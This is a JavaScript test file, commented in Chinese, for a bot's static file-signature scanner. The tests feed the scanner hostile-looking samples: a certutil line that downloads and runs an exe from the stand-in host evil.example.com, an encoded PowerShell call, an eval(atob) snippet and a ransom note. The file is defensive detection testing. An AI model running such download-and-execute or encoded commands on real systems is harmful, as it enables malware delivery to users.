// V0.4.6 測試：檔案特徵碼掃描（靜態偵測引擎）
const fs = require('fs');
const path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'bot.js'), 'utf8');

let pass = 0, fail = 0;
function check(name, actual, expected) {
    if (JSON.stringify(actual) === JSON.stringify(expected)) {
        pass++;
        console.log(`✅ ${name}`);
    } else {
        fail++;
        console.log(`❌ ${name}: 期望 ${JSON.stringify(expected)}，實際 ${JSON.stringify(actual)}`);
    }
}

const fsStart = src.indexOf('// ============ V0.4.6：檔案特徵碼掃描引擎');
const fsEnd = src.indexOf('const OFFICIAL_DOMAINS = [');
if (fsStart === -1 || fsEnd === -1) { console.error('❌ 找不到掃描引擎'); process.exit(1); }
const fsCode = src.slice(fsStart, fsEnd);
const scan = new Function(fsCode + '; return scanFileContent;')();

// 1) PE 可執行檔頭
{
    const buf = Buffer.alloc(512);
    buf[0] = 0x4D; buf[1] = 0x5A; // MZ
    buf.writeUInt32LE(0x80, 0x3C); // e_lfanew = 0x80
    buf.writeUInt32LE(0x00004550, 0x80); // PE\0\0
    const r = scan(buf, 'setup.exe');
    check('PE 頭偵測（MZ+PE 標記）', r.hits.some(h => h.id === 'pe_executable'), true);
    check('PE 命中權重 3', r.hits.find(h => h.id === 'pe_executable').weight, 3);
}

// 2) 正常文字檔不命中
{
    const r = scan(Buffer.from('今天天氣很好，這是正常的聊天訊息內容。'.repeat(10)), 'note.txt');
    check('正常文字檔零命中', r.hits.length, 0);
    check('正常文字檔零連結', r.urls.length, 0);
    check('正常文字檔風險 0', r.risk, 0);
}

// 3) 危險副檔名（含雙副檔名偽裝）
{
    const r = scan(Buffer.from('hello'), 'photo.jpg.exe');
    check('雙副檔名偽裝偵測', r.hits.some(h => h.id === 'dangerous_ext'), true);
}
{
    const r = scan(Buffer.from('hello'), 'readme.txt');
    check('普通副檔名不命中', r.hits.some(h => h.id === 'dangerous_ext'), false);
}

// 4) PowerShell 編碼執行
{
    const r = scan(Buffer.from('$code = "SGVsbG8="; powershell -enc $code'), 'p.ps1');
    check('PowerShell -enc 偵測', r.hits.some(h => h.id === 'ps_encoded'), true);
}

// 5) LOLBin 下載執行鏈
{
    const r = scan(Buffer.from('certutil -urlcache -f http://evil.example.com/x.exe C:\\Windows\\Temp\\x.exe && x.exe'), 'down.bat');
    check('certutil 下載執行偵測', r.hits.some(h => h.id === 'lolbin_download'), true);
}

// 6) 混淆執行
{
    const r = scan(Buffer.from('eval(atob("dmFyIGJhZCA9IHRydWU7"))'), 'evil.js');
    check('eval(atob 混淆偵測', r.hits.some(h => h.id === 'obfuscated_eval'), true);
}

// 7) Base64 巨塊
{
    const r = scan(Buffer.from('aGVsbG8gd29ybGQg'.repeat(60)), 'payload.txt');
    check('Base64 巨塊偵測', r.hits.some(h => h.id === 'base64_blob'), true);
}

// 8) 勒索軟體特徵
{
    const r = scan(Buffer.from('YOUR FILES HAVE BEEN ENCRYPTED. To recover them send 0.05 BTC to wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa within 72 hours.'), 'readme.txt');
    check('勒索字串偵測', r.hits.some(h => h.id === 'ransomware'), true);
}

// 9) 內嵌 URL 抽取
{
    const r = scan(Buffer.from('請到 https://discord-nitro-giveaway.example.xyz/claim 領取獎勵'), 'invite.txt');
    check('內嵌 URL 抽取', r.urls.includes('discord-nitro-giveaway.example.xyz'), true);
}

// 10) 風險加總
{
    const buf = Buffer.alloc(256);
    buf[0] = 0x4D; buf[1] = 0x5A; buf.writeUInt32LE(0x80, 0x3C); buf.writeUInt32LE(0x00004550, 0x80);
    const r = scan(buf, 'tool.exe');
    check('PE+危險副檔名風險 = 5', r.risk, 5);
    check('風險 ≥4 判高風險', r.risk >= 4, true);
}

console.log(`\n========== ${fail === 0 ? '全部通過' : '有失敗'}（${pass} 通過 / ${fail} 失敗）==========`);
process.exit(fail === 0 ? 0 : 1);
